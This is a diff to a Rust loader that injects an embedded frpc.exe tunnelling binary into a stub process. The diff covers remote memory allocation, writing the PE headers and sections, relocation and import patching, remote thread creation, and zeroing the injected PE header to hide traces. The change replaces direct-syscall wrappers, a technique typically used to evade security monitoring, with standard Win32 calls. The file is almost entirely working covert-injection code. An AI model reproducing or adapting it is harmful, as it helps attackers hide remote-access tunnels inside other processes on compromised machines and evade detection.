@@ -1,22 +1,19 @@
-#[cfg(target_arch = "x86_64")]
-use crate::syscall::{
-    SyscallTable, nt_allocate_virtual_memory, nt_create_thread_ex, nt_protect_virtual_memory,
-    nt_write_virtual_memory,
-};
 use goblin::pe::PE;
 use log::{debug, error, info};
 use std::ptr;
-use windows_sys::Win32::Foundation::{CloseHandle, HANDLE};
-use windows_sys::Win32::System::Diagnostics::Debug::ReadProcessMemory;
+use windows_sys::Win32::Foundation::{CloseHandle, FALSE, HANDLE};
+use windows_sys::Win32::System::Diagnostics::Debug::{ReadProcessMemory, WriteProcessMemory};
 use windows_sys::Win32::System::JobObjects::{
     AssignProcessToJobObject, CreateJobObjectW, JOBOBJECT_EXTENDED_LIMIT_INFORMATION,
     JobObjectExtendedLimitInformation, SetInformationJobObject,
 };
 use windows_sys::Win32::System::LibraryLoader::{GetProcAddress, LoadLibraryA};
 use windows_sys::Win32::System::Memory::{
-    MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READ, PAGE_READWRITE,
+    MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READ, PAGE_READWRITE, VirtualAllocEx, VirtualProtectEx,
 };
-use windows_sys::Win32::System::Threading::{GetExitCodeProcess, WaitForSingleObject};
+use windows_sys::Win32::System::Threading::{
+    CreateRemoteThread, GetExitCodeProcess, WaitForSingleObject,
+};
 
 #[cfg(target_os = "windows")]
 pub static STUB_EXE: &[u8] = include_bytes!("../stub/stub.exe");
@@ -42,18 +39,6 @@ pub unsafe fn inject_and_run(
     thread_handle_host: HANDLE,
     frpc_buffer: &[u8],
 ) {
-    let syscall_table = match unsafe { SyscallTable::init() } {
-        Some(t) => t,
-        None => {
-            error!("Failed to initialize syscall table, aborting");
-            unsafe {
-                CloseHandle(process_handle);
-                CloseHandle(thread_handle_host);
-            }
-            return;
-        }
-    };
-
     debug!("Parsing frpc.exe PE structure...");
     let pe = PE::parse(frpc_buffer).expect("Failed to parse frpc.exe PE structure");
     let optional_header = pe.header.optional_header.as_ref().unwrap();
@@ -63,27 +48,15 @@ pub unsafe fn inject_and_run(
     let entry_point_rva = optional_header.standard_fields.address_of_entry_point as u64;
 
     // 在 stub.exe 中申請記憶體並寫入 frpc
-    let mut remote_image_base: *mut std::ffi::c_void = ptr::null_mut();
-    let mut region_size = size_of_image;
-    let status = unsafe {
-        nt_allocate_virtual_memory(
-            &syscall_table,
-            process_handle as isize,
-            &mut remote_image_base,
-            0,
-            &mut region_size,
+    let remote_image_base = unsafe {
+        VirtualAllocEx(
+            process_handle,
+            ptr::null_mut(),
+            size_of_image,
             MEM_COMMIT | MEM_RESERVE,
             PAGE_READWRITE,
         )
     };
-    if status < 0 || remote_image_base.is_null() {
-        error!("NtAllocateVirtualMemory failed: 0x{:x}", status as u32);
-        unsafe {
-            CloseHandle(process_handle);
-            CloseHandle(thread_handle_host);
-        }
-        return;
-    }
 
     if remote_image_base.is_null() {
         error!(
@@ -105,20 +78,19 @@ pub unsafe fn inject_and_run(
 
     // 寫入 PE 標頭
     let mut bytes_written: usize = 0;
-    let status = unsafe {
-        nt_write_virtual_memory(
-            &syscall_table,
-            process_handle as isize,
+    let res = unsafe {
+        WriteProcessMemory(
+            process_handle,
             remote_image_base,
-            frpc_buffer.as_ptr() as *const _,
+            frpc_buffer.as_ptr() as *const std::ffi::c_void,
             size_of_headers,
             &mut bytes_written,
         )
     };
-    if status < 0 {
+    if res == FALSE {
         error!(
-            "NtWriteVirtualMemory (header) failed: 0x{:x}",
-            status as u32
+            "Failed to write PE header! Error code: {}",
+            std::io::Error::last_os_error()
         );
         unsafe {
             CloseHandle(process_handle);
@@ -144,21 +116,21 @@ pub unsafe fn inject_and_run(
         };
 
         let mut sec_written: usize = 0;
-        let status = unsafe {
-            nt_write_virtual_memory(
-                &syscall_table,
-                process_handle as isize,
+        let res = unsafe {
+            WriteProcessMemory(
+                process_handle,
                 remote_section_addr,
-                local_ptr as *const _,
+                local_ptr as *const std::ffi::c_void,
                 section.size_of_raw_data as usize,
                 &mut sec_written,
             )
         };
-        if status < 0 {
+
+        if res == FALSE {
             error!(
-                "NtWriteVirtualMemory section [{}] failed: 0x{:x}",
+                "Failed to write section [{}]! Error code: {}",
                 String::from_utf8_lossy(&section.name),
-                status as u32
+                std::io::Error::last_os_error()
             );
             unsafe {
                 CloseHandle(process_handle);
@@ -258,9 +230,8 @@ pub unsafe fn inject_and_run(
                             let new_val = old_val.wrapping_add(delta);
                             let mut bw: usize = 0;
                             unsafe {
-                                nt_write_virtual_memory(
-                                    &syscall_table,
-                                    process_handle as isize,
+                                WriteProcessMemory(
+                                    process_handle,
                                     remote_addr,
                                     &new_val as *const u64 as *const _,
                                     8,
@@ -406,9 +377,8 @@ pub unsafe fn inject_and_run(
 
                     let mut bw: usize = 0;
                     unsafe {
-                        nt_write_virtual_memory(
-                            &syscall_table,
-                            process_handle as isize,
+                        WriteProcessMemory(
+                            process_handle,
                             iat_remote_addr,
                             &addr_val as *const _ as *const _,
                             8,
@@ -452,25 +422,29 @@ pub unsafe fn inject_and_run(
         };
 
         let remote_addr = unsafe { remote_image_base.add(section.virtual_address as usize) };
-
-        let mut remote_addr_mut = remote_addr as *mut _;
-        let mut vsize = section.virtual_size as usize;
         let mut old_protect: u32 = 0;
-        let status = unsafe {
-            nt_protect_virtual_memory(
-                &syscall_table,
-                process_handle as isize,
-                &mut remote_addr_mut,
-                &mut vsize,
+
+        let res = unsafe {
+            VirtualProtectEx(
+                process_handle,
+                remote_addr,
+                section.virtual_size as usize,
                 protect,
                 &mut old_protect,
             )
         };
-        if status < 0 {
+
+        if res == FALSE {
             error!(
-                "NtProtectVirtualMemory section [{}] failed: 0x{:x}",
+                "Failed to change section [{}] permissions! Error code: {}",
                 String::from_utf8_lossy(&section.name),
-                status as u32
+                std::io::Error::last_os_error()
+            );
+        } else {
+            debug!(
+                "Section [{}] permissions set to 0x{:x}",
+                String::from_utf8_lossy(&section.name).trim_matches('\0'),
+                protect
             );
         }
     }
@@ -485,30 +459,15 @@ pub unsafe fn inject_and_run(
 
     // 分配 8MB stack 給 Go runtime（Go 的 goroutine scheduler 需要較大的初始 stack）
     let stack_size = 8 * 1024 * 1024usize;
-    let mut new_stack: *mut std::ffi::c_void = ptr::null_mut();
-    let mut stack_region_size = stack_size;
-    let status = unsafe {
-        nt_allocate_virtual_memory(
-            &syscall_table,
-            process_handle as isize,
-            &mut new_stack,
-            0,
-            &mut stack_region_size,
+    let new_stack = unsafe {
+        VirtualAllocEx(
+            process_handle,
+            ptr::null_mut(),
+            stack_size,
             MEM_COMMIT | MEM_RESERVE,
             PAGE_READWRITE,
         )
     };
-    if status < 0 || new_stack.is_null() {
-        error!(
-            "NtAllocateVirtualMemory (stack) failed: 0x{:x}",
-            status as u32
-        );
-        unsafe {
-            CloseHandle(process_handle);
-            CloseHandle(thread_handle_host);
-        }
-        return;
-    }
     if new_stack.is_null() {
         error!(
             "Failed to allocate stack: {}",
@@ -529,27 +488,26 @@ pub unsafe fn inject_and_run(
     // lpStartAddress 型別為 LPTHREAD_START_ROUTINE，即 unsafe extern "system" fn(*mut c_void) -> u32
     // 我們把 frpc entry point 強制轉型塞進去（Go runtime 的 entry 不是這個 signature，
     // 但 Windows 只是把這個位址當 RIP，實際 calling convention 由 Go runtime 自己處理）
-    let mut thread_handle: isize = 0;
-    let status = unsafe {
-        nt_create_thread_ex(
-            &syscall_table,
-            &mut thread_handle,
-            process_handle as isize,
-            &crate::syscall::NtCreateThreadExParams {
-                desired_access: 0x1FFFFF,
-                object_attributes: 0,
-                start_routine: remote_entry_point as usize,
-                argument: 0,
-                create_flags: 0,
-                zero_bits: 0,
-                stack_size,
-                maximum_stack_size: stack_size * 2,
-                attribute_list: 0,
-            },
+    let thread_handle = unsafe {
+        CreateRemoteThread(
+            process_handle,
+            ptr::null(), // 預設安全屬性
+            stack_size,  // stack 大小
+            Some(std::mem::transmute::<
+                u64,
+                unsafe extern "system" fn(*mut std::ffi::c_void) -> u32,
+            >(remote_entry_point)), // 執行緒起始位址
+            ptr::null(), // 傳入參數（frpc 不需要）
+            0,           // 立即執行
+            ptr::null_mut(), // 不需要 thread ID
         )
     };
-    if status < 0 || thread_handle == 0 {
-        error!("NtCreateThreadEx failed: 0x{:x}", status as u32);
+
+    if thread_handle.is_null() {
+        error!(
+            "CreateRemoteThread failed! Error code: {}",
+            std::io::Error::last_os_error()
+        );
         unsafe {
             CloseHandle(process_handle);
             CloseHandle(thread_handle_host);
@@ -559,18 +517,20 @@ pub unsafe fn inject_and_run(
 
     // 將 remote_image_base 的 PE header 清除
     let zeros = vec![0u8; size_of_headers];
-    let mut bw: usize = 0;
+    let mut bytes_written: usize = 0;
     unsafe {
-        nt_write_virtual_memory(
-            &syscall_table,
-            process_handle as isize,
+        WriteProcessMemory(
+            process_handle,
             remote_image_base,
-            zeros.as_ptr() as *const _,
+            zeros.as_ptr() as *const std::ffi::c_void,
             zeros.len(),
-            &mut bw,
+            &mut bytes_written,
         );
     }
-    debug!("Successfully cleared PE header! Bytes written: 0x{:x}", bw);
+    debug!(
+        "Successfully cleared PE header! Bytes written: 0x{:x}",
+        bytes_written
+    );
 
     debug!(
         "Successfully created remote thread! Thread Handle: 0x{:x}",
@@ -608,7 +568,7 @@ pub unsafe fn inject_and_run(
     debug!("exit_code: 0x{:08x} ({})", exit_code, exit_code);
 
     unsafe {
-        CloseHandle(thread_handle as HANDLE);
+        CloseHandle(thread_handle);
         CloseHandle(thread_handle_host);
         CloseHandle(process_handle);
     }
